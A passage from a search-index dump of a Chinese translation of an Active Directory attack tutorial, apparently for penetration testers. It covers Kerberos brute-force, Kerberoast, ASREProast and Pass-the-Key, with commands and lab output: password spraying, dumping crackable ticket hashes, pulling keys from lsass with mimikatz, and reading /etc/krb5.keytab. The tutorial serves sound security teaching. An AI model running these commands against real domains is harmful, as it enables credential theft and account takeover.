<p>\u5b9e\u9645\u4e0a\uff0c\u5b58\u5728\u591a\u79cd\u4e0d\u540c\u7684\u5bc6\u94a5\uff0c\u56e0\u4e3a\u6bcf\u4e2a\u5bc6\u94a5\u5bf9\u5e94\u4e8eKerberos\u6240\u7528\u7684\u4e00\u79cd\u52a0\u5bc6\u7b97\u6cd5\u3002Kerberos\u652f\u6301\u7684\u52a0\u5bc6\u7b97\u6cd5\u5982\u4e0b\uff1a * * RC4-HMAC\uff1aRC4\u7b97\u6cd5\u4f7f\u7528\u7684\u5bc6\u94a5\u662f\u7528\u6237\u7684NT\u54c8\u5e0c\u503c\u3002 * AES128-CTS-HMAC-SHA1-96\uff1aAES128\u7b97\u6cd5\u4f7f\u7528\u7684\u5bc6\u94a5\u662f\u4ece\u7528\u6237\u5bc6\u7801\uff08\u4ee5\u53ca\u57df\u548c\u7528\u6237\u540d\uff09\u6d3e\u751f\u768416\u4e2a\u5b57\u8282\u7684\u54c8\u5e0c\u503c\u3002 * AES256-CTS-HMAC-SHA1-96\uff1aAES256\u7b97\u6cd5\u4f7f\u7528\u7684\u5bc6\u94a5\u662f\u4ece\u7528\u6237\u5bc6\u7801\uff08\u4ee5\u53ca\u57df\u548c\u7528\u6237\u540d\uff09\u6d3e\u751f\u768432\u4e2a\u5b57\u8282\u7684\u54c8\u5e0c\u503c\u3002 * DES-CBC-MD5\uff1a\u8fd9\u4e2a\u662f\u4e0d\u63a8\u8350\u7684\uff0c\u4f46\u662f\u5176\u5bc6\u94a5\u4ecd\u7136\u5b58\u50a8\u5728\u57df\u6570\u636e\u5e93\u4e2d\u3002</p> <p>\u6839\u636e\u6240\u9009\u7684\u7b97\u6cd5\uff0cKerberos\u5c06\u4f7f\u7528\u5bf9\u5e94\u7684\u5bc6\u94a5\u3002\u5728Active Directory\u4e2d\uff0c\u5efa\u8bae\u4f7f\u7528AES256\u7b97\u6cd5\u3002</p> <p>\u6ce8\u610f\uff1a\u5f53\u6211\u5728\u672c\u6587\u4e2d\u4f7f\u7528\u672f\u8bedKerberos\u5bc6\u94a5\u65f6\uff0c\u4e00\u822c\u6307\u7684\u662f\u7531Kerberos\u534f\u5546\u7684\u4efb\u4f55\u53ef\u80fd\u7684\u5bc6\u94a5\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#kerberos-basic-attacks","title":"Kerberos basic attacks","text":"<p>\u73b0\u5728\u6211\u4eec\u5df2\u7ecf\u4e86\u89e3\u4e86Kerberos\u7684\u57fa\u672c\u77e5\u8bc6\uff0c\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u5f00\u59cb\u4ecb\u7ecd\u5404\u79cd\u653b\u51fbKerberos\u7684\u65b9\u6cd5\u3002</p> <p>\u8981\u60f3\u4e86\u89e3\u5168\u9762\u7684Kerberos\u653b\u51fb\u547d\u4ee4\uff0c\u8bf7\u53c2\u9605https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#kerberos-brute-force","title":"Kerberos brute-force","text":"<p>\u7531\u4e8eKerberos\u662f\u4e00\u79cd\u8eab\u4efd\u9a8c\u8bc1\u534f\u8bae\uff0c\u56e0\u6b64\u53ef\u4ee5\u4f7f\u7528\u5b83\u6765\u6d4b\u8bd5\u7f51\u7edc\u4e2d\u7528\u6237\u7684\u51ed\u636e\u3002</p> <p>\u6b64\u5916\uff0cKerberos\u7684\u9519\u8bef\u6d88\u606f\u662f\u975e\u5e38\u8be6\u7ec6\u7684\uff0c\u53ef\u4ee5\u7528\u6765\u533a\u5206\u86ee\u529b\u653b\u51fb\u4e2d\u9047\u5230\u7684\u4e0d\u540c\u60c5\u51b5\uff1a</p> <ul> <li>kdc_err_preauth_failed\uff1a\u5bc6\u7801\u4e0d\u6b63\u786e</li> <li>kdc_err_c_principal_unknown\uff1a\u65e0\u6548\u7684\u7528\u6237\u540d</li> <li>KDC_ERR_INVERR_REALL\uff1a\u65e0\u6548\u7684\u57df</li> <li>kdc_err_client_revoked\uff1a\u5df2\u88ab\u7981\u7528/\u5c01\u9501\u7684\u7528\u6237</li> </ul> <p>\u901a\u8fc7\u68c0\u67e5\u9519\u8bef\u6d88\u606f\uff0c\u60a8\u4e0d\u4ec5\u53ef\u4ee5\u6d4b\u8bd5\u6709\u6548\u7684\u51ed\u636e\uff0c\u8fd8\u53ef\u4ee5\u679a\u4e3e\u7528\u6237\u5e10\u6237\uff0c\u5e76\u77e5\u9053\u653b\u51fb\u662f\u5426\u963b\u6b62\u4e86\u67d0\u4e9b\u5e10\u6237\u3002\u6ce8\u610f\uff0c\u53d1\u52a8\u8fd9\u79cd\u653b\u51fb\u65f6\u8981\u683c\u5916\u5c0f\u5fc3\uff01\uff01</p> <p>\u9700\u8981\u8bb0\u4f4f\u7684\u53e6\u4e00\u4ef6\u4e8b\u662f\uff0c\u8eab\u4efd\u9a8c\u8bc1\u9519\u8bef\u4e0d\u662f\u4e0e\u666e\u901a\u767b\u5f55\u5931\u8d25\u4e8b\u4ef6\uff08\u4ee3\u7801:4625)\u4e00\u8d77\u8bb0\u5f55\u7684\uff0c\u800c\u662f\u4e0e\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4e0d\u8bb0\u5f55\u7684Kerberos\u9884\u8eab\u4efd\u9a8c\u8bc1\u5931\u8d25\uff08\u4ee3\u7801:4771\uff09\u4e00\u8d77\u8bb0\u5f55\u7684\u3002</p> <p>\u60a8\u53ef\u4ee5\u4f7f\u7528Rubeus brute\u3001kerbrute(Go)\u3001kerbrute\uff08Python\uff09\u6216cerbero\u6765\u53d1\u52a8Kerberos\u86ee\u529b\u653b\u51fb\u3002</p> <p><code>$ python kerbrute.py -domain contoso.local -users users.txt -passwords passwords.txt -dc-ip 192.168.100.2 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation  [*] Valid user =&gt; Anakin [*] Blocked/Disabled user =&gt; Leia [*] Valid user =&gt; Han [NOT PREAUTH] [*] Valid user =&gt; Administrator [*] Stupendous =&gt; Anakin:Vader1234! [*] Saved TGT in Anakin.ccache</code></p> <p>\u4f7f\u7528kerbrute.py\u811a\u672c\u53d1\u52a8Kerberos\u86ee\u529b\u653b\u51fb</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#kerberoast","title":"Kerberoast","text":"<p>\u5728Active Directory\u4e2d\uff0c\u4efb\u4f55\u7528\u6237\u90fd\u53ef\u4ee5\u901a\u8fc7SPN\u4e3a\u5176\u5728\u57df\u6570\u636e\u5e93\u4e2d\u6ce8\u518c\u7684\u4efb\u4f55\u670d\u52a1\u8bf7\u6c42ST\uff0c\u800c\u4e0d\u7ba1\u8be5\u670d\u52a1\u662f\u5426\u6b63\u5728\u8fd0\u884c\u3002</p> <p>\u6b64\u5916\uff0cST\u5c06\u4f7f\u7528\u670d\u52a1\u7528\u6237\u7684Kerberos\u5bc6\u94a5\uff08\u4ece\u5bc6\u7801\u6d3e\u751f\uff09\u8fdb\u884c\u90e8\u5206\u52a0\u5bc6\u3002\u56e0\u6b64\uff0c\u5982\u679c\u83b7\u5f97\u4e86ST\uff0c\u5219\u53ef\u4ee5\u5c1d\u8bd5\u901a\u8fc7\u89e3\u5bc6ST\u6765\u7834\u89e3\u670d\u52a1\u7528\u6237\u5bc6\u7801\u3002</p> <p>\u5927\u591a\u6570\u670d\u52a1\u90fd\u662f\u6ce8\u518c\u5728\u673a\u5668\u5e10\u6237\u4e2d\u7684\uff0c\u5e76\u4e14\u5177\u6709\u81ea\u52a8\u751f\u6210\u7684120\u4e2a\u5b57\u7b26\u7684\u5bc6\u7801\uff0c\u540c\u65f6\uff0c\u8fd9\u4e9b\u5bc6\u7801\u6bcf\u4e2a\u6708\u90fd\u4f1a\u53d8\u4e00\u6b21\uff0c\u6240\u4ee5\u7834\u89e3\u5b83\u4eec\u7684ST\u662f\u884c\u4e0d\u901a\u7684\u3002</p> <p>\u7136\u800c\uff0c\u67d0\u4e9b\u670d\u52a1\u6709\u65f6\u4f1a\u88ab\u5206\u914d\u7ed9\u7531\u4eba\u7ba1\u7406\u7684\u666e\u901a\u7528\u6237\u5e10\u6237\uff0c\u8fd9\u4e9b\u5e10\u6237\u53ef\u80fd\u5177\u6709\u5f31\u5bc6\u7801\u3002\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5c31\u53ef\u4ee5\u8bbe\u6cd5\u7834\u89e3\u8fd9\u4e9b\u670d\u52a1\u7684ST\uff0c\u4ece\u800c\u5f97\u5230\u7528\u6237\u5bc6\u7801\u3002</p> <p>Kerberoast\u653b\u51fb\u5305\u62ec\u5bf9\u666e\u901a\u7528\u6237\u5e10\u6237\u7684\u670d\u52a1\u7684\u8bf7\u6c42ST\uff0c\u5e76\u8bd5\u56fe\u7834\u89e3\u8fd9\u4e9b\u8bf7\u6c42\u4ee5\u83b7\u5f97\u7528\u6237\u5bc6\u7801\u3002\u901a\u5e38\uff0c\u62e5\u6709\u670d\u52a1\u7684\u7528\u6237\u4e5f\u62e5\u6709\u7279\u6743\uff0c\u6240\u4ee5\u8fd9\u4e9b\u5e10\u6237\u901a\u5e38\u4f1a\u6210\u4e3a\u653b\u51fb\u8005\u7684\u76ee\u6807\u3002</p> <p>\u901a\u8fc7\u4f7f\u7528\u4ee5\u4e0b\u7b5b\u9009\u5668\uff0c\u53ef\u4ee5\u5728\u4efb\u4f55LDAP\u5ba2\u6237\u7aef\u4e2d\u4f7f\u7528SPN\u68c0\u67e5\u7528\u6237\u5e10\u6237\uff1a</p> <p><code>(&amp;(samAccountType=805306368)(servicePrincipalName=*))</code></p> <p>\u901a\u8fc7\u57fa\u4e8eSPN\u7684LDAP\u7b5b\u9009\u5668\uff0c\u6765\u7b5b\u9009\u7528\u6237</p> <p>\u66f4\u5177\u4f53\u5730\u8bf4\uff0c\u8981\u68c0\u7d22\u5f85\u7834\u89e3\u7684ST\uff0c\u53ef\u4ee5\u4f7f\u7528impacket\u63d0\u4f9b\u7684GetUserSPNs.py\u811a\u672c\u3001Rubeus\u7684kerberoast\u547d\u4ee4\uff0c\u6216Invoke-Kerberoast.ps1\u811a\u672c\u3002</p> <p><code>root@debian10:~# GetUserSPNs.py 'contoso.local/Anakin:Vader1234!' -dc-ip 192.168.100.2 -outputfile kerberoast-hashes.txt Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation  ServicePrincipalName  Name  MemberOf                                       PasswordLastSet             LastLogon                   Delegation  --------------------  ----  ---------------------------------------------  --------------------------  --------------------------  ---------- HTTP/ws01-10          leia  CN=Domain Admins,CN=Users,DC=contoso,DC=local  2021-01-01 16:38:02.183703  2021-01-15 11:46:13.998905               root@debian10:~# cat kerberoast-hashes.txt  $krb5tgs$23$*leia$CONTOSO.LOCAL$HTTP/ws01-10*$65ca3e856acd6d9438c05cb6c283dcb5$ab86cafcf1dee23d2466973679fc315e9fef3fa2ddcae82d844b31e1651ed983a4d4ff0846148ddf63f80129cd2cb663c7daed26169513ec398464a9796ae7f84e593829f16654279d5b3fa4286eb1e6467a3d569bc88d7150f30cf2dc83ff4185f0a7590b9e5a05ba63cb9dbb710df295c4356cc57ac53cc2d0e0974aeb0e2ae930e6311c5268c457d5da726393e93e9b0d1c8d745ad7b6d63bf36eb11c7f171da87bee9d4ac69b2a8f70157ce402af52ffd35498e3cade179af266be08e5fcf3aee6a0dae26afb6470ba2d25c922868b9a0ca4c80eece585782ea0ea96b6e4f3ee56dc1808990ecf456c021d04ec74edef98b3235553176e55d56a7f3ee9c76f2f22ab7e3d30fabc658a516f8ef03710032aaae36a917cc7e677857c09df3035bd6034aa192c620c9cb6452533225e9606ac06cf0a6a5865468599cd73907b574cef0c081df388ea50176288a444692db96026d2f33f3ba4e8597d11557443e262bee86ca6485272addcf03056a93b6e7e60c02a152640f320e7094f5897fbf1cee83ab45a6f62fc554ec1c67878d9aa7974e43e2f1bdff2b0c197e3ccbd9daf84c1a37bc453aec6a0fa502c05ae530e14a5d1f7bceb5cb1393460a0f8eec8b058ede6ceda637a3c248fcd1e1fe57ae2f2d343c5e749cf9897023b910a3e2b13025584b2a9d4e73e9809ba25231b3fd3616476e51406993d354c9015a95888957e3d3d69784dc8b5c12b11e225756a41485c57467aa1c4041e6c7879f4efe65710fd760c5c3472f1ebefefa8a0f5099ccff5ef84162b1ddd42d795d82a8ac09f811e692c5aec13ee5f9e6335a5501f50412cee10da5a1a444cc5a1f9885885088b6f01d36dc8684101fde2a3c4a40ffe424ca8b3512455f5662794c64fed3b5183aaa9a338f18a33da8e41ac8a4e5598925cfe49db7362f107e018694922b26e20d5e3f125ff151f4299919fa082ad6f0d15643a69584a41b06ba46cca25c57ac51e7430c9166cdcc34428e108fba970d0c550694b431179d867f6b6dfe91e893be37bcf8407e9965921cbcf7b17a7f575ec64e4c7fb8bde0d4994b382cc58b44fc964528ac9aae46b5a84109f3f3ef23a71cca40355d71c95aa191cc11fbd66613f05f58eb74b07530b3deef934811da775c00d6a4217508501b14958b5241a8be72d20f891d5122936ebee8c636a7c746a3bae78d435c11efa4c8693d87d9d7f7c7369ea620d886affea1e1cfbcb216d9f44ad42fedbc81f71722eccc6b54b00c2e80902a1fe49d06ca099f8db51aa1f2ad9ad761208f38803d0c842bbbcaf0c08259904eebdd4</code></p> <p>\u57fa\u4e8eGetUserSPNs.py\u7684Kerberoast\u653b\u51fb</p> <p>\u4e00\u65e6ST\u5230\u624b\uff0c\u5c31\u53ef\u4ee5\u5c1d\u8bd5\u7528hashcat\u8fdb\u884c\u7834\u89e3\u3002\u4e3a\u4e86\u4fbf\u4e8e\u7834\u89e3\uff0c\u5e94\u8be5\u4f7f\u7528RC4\u7b97\u6cd5\u5bf9ST\u8bf7\u6c42\u8fdb\u884c\u52a0\u5bc6\uff0c\u4f46\u662f\uff0c\u7531\u4e8e\u5927\u591a\u6570\u8bf7\u6c42\u90fd\u9700\u8981AES256\u52a0\u5bc6\uff0c\u8fd9\u53ef\u80fd\u88ab\u68c0\u6d4b\u4e3a\u5f02\u5e38\u7f51\u7edc\u6d41\u91cf\uff08\u901a\u8fc7Microsoft ATA\u7b49\u89e3\u51b3\u65b9\u6848\uff09\u3002</p> <p>\u5f53\u7136\uff0c\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u5728\u4e0d\u77e5\u9053\u670d\u52a1SPN\u7684\u60c5\u51b5\u4e0b\u6267\u884cKerberoasting\u653b\u51fb\u3002\u8bf7\u8bb0\u4f4f\uff0c\u60a8\u53ef\u4ee5\u4e3a\u57df\u4e2d\u7684\u4e0d\u540c\u4e3b\u4f53\uff08\u5305\u62ec\u670d\u52a1\u548c\u7528\u6237\uff09\u8bf7\u6c42Kerberos\u7968\u8bc1\u3002</p> <p>\u56e0\u6b64\uff0c\u60a8\u53ef\u4ee5\u4e3a\u7ed9\u5b9a\u7684\u7528\u6237\u8bf7\u6c42\u7968\u8bc1\uff0c\u8be5\u7968\u8bc1\u5c06\u4f7f\u7528\u7528\u6237\u5bc6\u94a5\u8fdb\u884c\u52a0\u5bc6\u3002\u4f46\u662f\uff0c\u76ee\u6807\u7528\u6237\u5fc5\u987b\u6ce8\u518c\u4e86\u76f8\u5173\u7684\u670d\u52a1\uff0c\u624d\u80fd\u4e3a\u5176\u68c0\u7d22\u7968\u8bc1\u3002</p> <p>\u7531\u4e8e\u4e3a\u7528\u6237\u4f5c\u4e3a\u76ee\u6807\u4e3b\u4f53\u540d\u79f0\u83b7\u53d6\u7684ST\u4e5f\u662f\u901a\u8fc7\u7528\u6237\u5bc6\u94a5\u8fdb\u884c\u52a0\u5bc6\u7684\uff0c\u56e0\u6b64\uff0c\u5b83\u4eec\u4e5f\u53ef\u4ee5\u7528\u4e8eKerberoasting\u653b\u51fb\u3002\u53e6\u5916\uff0c\u5728\u65e0\u6cd5\u901a\u8fc7LDAP\u679a\u4e3e\u7528\u6237\u7684\u65f6\u5019\uff0c\u8fd9\u5bf9\u4e8e\u7a77\u4e3ekerberoasteable\u7528\u6237\u4e5f\u662f\u5f88\u6709\u7528\u7684\uff0c\u56e0\u4e3a\u6ca1\u6709SPN\u7684\u7528\u6237\u7684\u4e3b\u4f53\u540d\u79f0\u662f\u65e0\u6cd5\u89e3\u6790\u7684\u3002</p> <p>\u5b9e\u9645\u4e0a\uff0cimpacket\u7684getuserspns.py\u811a\u672c\u5c31\u4f7f\u7528\u4e86\u8fd9\u79cd\u6280\u672f\u3002\u5b83\u8fd8\u53ef\u4ee5\u4e0e\u5e26\u6709/enterprise\u6807\u5fd7\u7684Rubeus kerberoast\u547d\u4ee4\u548ccerbero kerberoast\u547d\u4ee4\u4e00\u8d77\u4f7f\u7528\u3002</p> <p>\u6b64\u5916\uff0c\u5982\u679c\u60a8\u5bf9\u4e00\u4e2a\u7528\u6237\u5e10\u6237\u5177\u6709Validated-SPN\u6743\u9650\u7684\u8bdd\uff0c\u5c31\u53ef\u4ee5\u4e3a\u8be5\u5e10\u6237\u6dfb\u52a0SPN\uff0c\u4f7f\u5176\u6210\u4e3aKerberoasteable\u7684\u3002\u8fd9\u6837\uff0c\u60a8\u5c31\u53ef\u4ee5\u4e3a\u8be5\u5e10\u6237\u670d\u52a1\u8bf7\u6c42\u4e00\u4e2aST\uff0c\u5e76\u5c1d\u8bd5\u7834\u89e3\u5b83\u3002\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5e10\u6237\u672c\u8eab\u5e76\u4e0d\u5177\u5907Validated-SPN\u6743\u9650\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#asreproast","title":"ASREProast","text":"<p>\u5b9e\u9645\u4e0a\uff0c\u5927\u591a\u6570\u7528\u6237\u90fd\u9700\u8981\u6267\u884cKerberos\u9884\u8eab\u4efd\u9a8c\u8bc1\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728AS-REQ\u6d88\u606f\u4e2d\u5411KDC\u53d1\u9001\u4e00\u4e2a\u7528Kerberos\u5bc6\u94a5\u52a0\u5bc6\u7684\u65f6\u95f4\u6233\uff08\u4ee5\u8bf7\u6c42TGT\uff09\u3002</p> <p>\u4f46\u662f\uff0c\u5728\u5c11\u6570\u60c5\u51b5\u4e0b\uff0c\u4f1a\u901a\u8fc7\u8bbe\u7f6eDONT_REQUIRE_PREAUTH\u6807\u5fd7\uff0c\u6765\u7981\u7528\u5e10\u6237\u7684Kerberos\u9884\u8eab\u4efd\u9a8c\u8bc1\u3002\u56e0\u6b64\uff0c\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u901a\u8fc7\u53d1\u9001AS-REQ\u6d88\u606f\u6765\u5192\u5145\u8fd9\u4e9b\u5e10\u6237\uff0c\u800c KDC\u5c06\u8fd4\u56deAS-REP\u54cd\u5e94\uff0c\u5e76\u4e14\u8be5\u54cd\u5e94\u662f\u901a\u8fc7\u7528\u6237\u7684Kerberos\u5bc6\u94a5\u8fdb\u884c\u52a0\u5bc6\u7684\u3002</p> <p><code>AS-REP          ::= [APPLICATION 11] KDC-REP  KDC-REP         ::= SEQUENCE {         pvno            [0] INTEGER (5),         msg-type        [1] INTEGER (11 -- AS --),         padata          [2] SEQUENCE OF PA-DATA OPTIONAL         crealm          [3] Realm,         cname           [4] PrincipalName,         ticket          [5] Ticket, -- Encrypted with krbtgt key         enc-part        [6] EncryptedData -- Encrypted with user key  }</code></p> <p>AS-REP\u6d88\u606f\u7684\u5b9a\u4e49</p> <p>\u60a8\u65e0\u6cd5\u76f4\u63a5\u8bbf\u95eeAS-REP\u6570\u636e\uff0c\u56e0\u4e3a\u5b83\u662f\u7528\u7528\u6237\u5bc6\u94a5\u52a0\u5bc6\u7684\uff08\u5b83\u6765\u81ea\u7528\u6237\u5bc6\u7801\uff09\uff0c\u4e0d\u8fc7\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u79bb\u7ebf\u7834\u89e3\u653b\u51fb\u6765\u83b7\u53d6\u7528\u6237\u5bc6\u7801\u3002</p> <p>\u53d1\u52a8ASREProast\u653b\u51fb\u65f6\uff0c\u5c06\u5728\u65e0\u9700Kerberos\u9884\u8eab\u4efd\u9a8c\u8bc1\u7684\u60c5\u51b5\u4e0b\u8bc6\u522b\u7528\u6237\uff0c\u5e76\u4ee5\u4ed6\u4eec\u7684\u8eab\u4efd\u6765\u53d1\u9001AS-REQ\uff0c\u4ee5\u68c0\u7d22AS-REP\u6d88\u606f\u4e2d\u7528\u7528\u6237\u5bc6\u94a5\u52a0\u5bc6\u7684\u6570\u636e\u3002\u4e00\u65e6\u5f97\u624b\uff0c\u5c31\u53ef\u4ee5\u8fdb\u884c\u79bb\u7ebf\u7834\u89e3\u653b\u51fb\uff0c\u4ee5\u6062\u590d\u7528\u6237\u5bc6\u7801\u3002</p> <p><code>(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))</code></p> <p>\u9488\u5bf9\u65e0\u9700\u8fdb\u884cKerberos\u9884\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237\u7684LDAP\u7b5b\u9009\u5668</p> <p>\u4f60\u53ef\u4ee5\u4f7f\u7528impacket GetNPUsers.py\u811a\u672c\u3001Rubeus asreproast\u547d\u4ee4\u6216ASREPRoast.ps1\u811a\u672c\u7b49\u5de5\u5177\u6765\u68c0\u7d22AS-REP\u7684\u52a0\u5bc6\u6570\u636e\u3002</p> <p><code>$ GetNPUsers.py 'contoso.local/Anakin:Vader1234!' -dc-ip 192.168.100.2 -outputfile asreproast-hashes.txt Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation  Name  MemberOf  PasswordLastSet             LastLogon                   UAC       ----  --------  --------------------------  --------------------------  -------- han             2020-12-16 10:53:35.177156  2021-05-12 09:19:28.469863  0x410200   root@debian10:~# cat asreproast-hashes.txt  $krb5asrep$23$han@CONTOSO.LOCAL:73eea4275625972c2e224648c4766b5a$1bbdaba56bb6eba4ea8cb565221de2fe2b5a8ade3d1155e33aa4d786624b84a62a100d97412361c851dfbf3d95ce3d047916bc66ddcec557f70b232a1d029f6a889e49e35069494b43e4b00b892d4ccc4d31e0c4970e8aff426eaa6821133e9a2bbef017ef9241c95d0098bfea4fd2b3c2919e1247de05d19db59fec46a81a60f0f89a2d9c105b9e00011387e756cb284b0ba785655526e3ba6c51f3b8eba21e674d4f1b4e93025f9cf0dccb1f86c3247f0b9ebfc663be5510faf2b77d932351ac4899cb77be58271dc01a3304bfd1de6216e04e5d9033859b92fa87438863c2dff112237c2ace8cffbc2dbb57c6</code></p> <p>\u4e00\u65e6\u83b7\u5f97\u4e86\u7528\u6237TGT\uff0c\u5c31\u53ef\u4ee5\u7528hashcat\u6765\u7834\u89e3\u5b83\u3002\u60a8\u53ef\u4ee5\u8bf7\u6c42\u4e00\u4e2a\u4f7f\u7528RC4\u7b97\u6cd5\u52a0\u5bc6\u7684\u4ee3\u7406\uff0c\u4ee5\u4fbf\u80fd\u591f\u66f4\u8f7b\u677e\u5730\u7834\u89e3\u5b83\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#pass-the-keyover-pass-the-hash","title":"Pass the Key/Over Pass the Hash","text":"<p>\u6b63\u5982\u4f60\u6240\u6ce8\u610f\u5230\u7684\uff0c\u5728\u8bf7\u6c42TGT\u65f6\uff0c\u7528\u6237\u4e0d\u9700\u8981\u4f7f\u7528\u5176\u5bc6\u7801\uff0c\u800c\u662f\u4f7f\u7528\u5176Kerberos\u5bc6\u94a5\u3002\u56e0\u6b64\uff0c\u5982\u679c\u653b\u51fb\u8005\u80fd\u591f\u7a83\u53d6Kerberos\u5bc6\u94a5\uff08NT\u54c8\u5e0c\u503c\u6216AES\u5bc6\u94a5\uff09\uff0c\u5c31\u53ef\u4ee5\u7528\u5b83\u6765\u5192\u5145\u7528\u6237\u8bf7\u6c42TGT\uff0c\u800c\u4e0d\u9700\u8981\u77e5\u9053\u7528\u6237\u5bc6\u7801\u3002</p> <p>\u5728Windows\u4e2d\uff0cKerberos\u5bc6\u94a5\u901a\u5e38\u88ab\u7f13\u5b58\u5728lsass\u8fdb\u7a0b\u4e2d\uff0c\u6240\u4ee5\uff0c\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528mimikatz sekurlsa::ekeys\u547d\u4ee4\u6765\u68c0\u7d22\u8be5\u5bc6\u94a5\u3002\u6b64\u5916\uff0c\u4f60\u4e5f\u53ef\u4ee5\u7528procdump\u3001sqldumper\u6216\u5176\u4ed6\u5de5\u5177\u6765\u8f6c\u50a8lsass\u8fdb\u7a0b\uff0c\u7136\u540e\u7528mimikatz\u79bb\u7ebf\u63d0\u53d6\u8be5\u5bc6\u94a5\u3002</p> <p>\u5728Linux\u4e2d\uff0cKerberos\u5bc6\u94a5\u4f1a\u88ab\u5b58\u50a8\u5728keytab\u6587\u4ef6\u4e2d\uff0c\u4ee5\u4fbf\u7528\u4e8eKerberos\u670d\u52a1\u3002keytab\u6587\u4ef6\u901a\u5e38\u53ef\u4ee5\u5728/etc/krb5.keytab\u4e2d\u627e\u5230\uff0c\u6216\u8005\u5728\u73af\u5883\u53d8\u91cfKRB5_KTNAME\u6216KRB5_CLIENT_KTNAME\u6307\u5b9a\u7684\u503c\u4e2d\u627e\u5230\uff0c\u6216\u8005\u5728/etc/krb5.conf\u4e2d\u7684Kerberos\u914d\u7f6e\u6587\u4ef6\u4e2d\u6307\u5b9a\u3002</p> <p>\u627e\u5230keytab\u540e\uff0c\u53ef\u4ee5\u5c06\u5176\u590d\u5236\u5230\u672c\u5730\u8ba1\u7b97\u673a\u548c/\u6216\u4f7f\u7528klist\uff08Kerberos MIT\uff09\u6216Cerbero\u6765\u63d0\u53d6\u5176\u5bc6\u94a5\u3002</p> <p><code>$ klist -k -Ke Keytab name: FILE:/etc/krb5.keytab KVNO Principal ---- --------------------------------------------------------------------------    1 r2d2@contoso.local (DEPRECATED:arcfour-hmac)  (0xc49a77fafad6d3a9270a8568fa453003)</code></p> <p>\u7528klist\u8bfb\u53d6keytab</p> <p>\u4e00\u65e6\u83b7\u5f97\u4e86Kerberos\u5bc6\u94a5\uff0c\u5c31\u53ef\u4ee5\u5728Windows\u4e2d\u901a\u8fc7Rubeus asktgt\u547d\u4ee4\u6765\u8bf7\u6c42TGT\u3002</p> <p>\u5728Linux\u673a\u5668\u4e2d\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528MIT Kerberos\u7a0b\u5e8f\u6765\u521b\u5efa\u57fa\u4e8e\u8be5\u5bc6\u94a5\u7684keytab\uff0c\u5e76\u8bf7\u6c42TGT\uff0c\u6216\u8005\u76f4\u63a5\u5c06\u5bc6\u94a5\u4e0eimpacket gettgt.py\u811a\u672c\u6216cerbero ask\u547d\u4ee4\u4e00\u8d77\u4f7f\u7528\u3002</p> <p><code>$ cerbero ask -u contoso.local/Anakin --aes ecce3d24b29c7f044163ab4d9411c25b5698337318e98bf2903bbb7f6d76197e -k 192.168.100.2 -vv INFO - Request contoso.local/Anakin TGT for contoso.local INFO - Save contoso.local/Anakin TGT for contoso.local in /root/Anakin.ccache</code></p> <p>\u57fa\u4e8ecerberod\u7684Pass-The-Key\u653b\u51fb</p> <p>Kerberos\u7968\u8bc1\u6709\u4e24\u79cd\u683c\u5f0f\uff1accache\u548ckrb\u3002ccache\u662fLinux\u673a\u5668\u7528\u6765\u5b58\u50a8\u7968\u8bc1\uff08\u901a\u5e38\u5728\u6587\u4ef6\u4e2d\uff09\u7684\u683c\u5f0f\u3002krb\u683c\u5f0f\u5728Windows\u4e2d\u7528\u4e8e\u5c06\u7968\u8bc1\u5b58\u50a8\u5728lsass\u5185\u5b58\u4e2d\uff0c\u5b83\u4e5f\u662f\u901a\u8fc7\u7f51\u7edc\u4f20\u8f93\u7968\u8bc1\u7684\u683c\u5f0f\u3002\u6b64\u5916\uff0c\u60a8\u8fd8\u53ef\u4ee5\u4f7f\u7528ticket_converter.py\u811a\u672c\u6216cerbero convert\u547d\u4ee4\u5c06\u7968\u8bc1\u4ece\u4e00\u79cd\u683c\u5f0f\u8f6c\u6362\u4e3a\u53e6\u4e00\u79cd\u683c\u5f0f\u3002</p> <p><code>$ python ticket_converter.py ~/Anakin.ccache ~/Anakin.krb Converting ccache =&gt; kirbi</code></p> <p>\u7528ticket_converter.py\u8f6c\u6362\u7968\u8bc1\u683c\u5f0f</p> <p>\u6b64\u5916\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528cerbero hash\u547d\u4ee4\uff0c\u901a\u8fc7\u7528\u6237\u5bc6\u7801\u8ba1\u7b97Kerberos\u5bc6\u94a5\u3002\u53e6\u5916\uff0c\u53ea\u9700\u51e0\u884cpython\u4ee3\u7801\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7get-kerberosaeskey.ps1\u6216NT\u54c8\u5e0c\u503c\u6765\u8ba1\u7b97AES\u5bc6\u94a5\u3002</p> 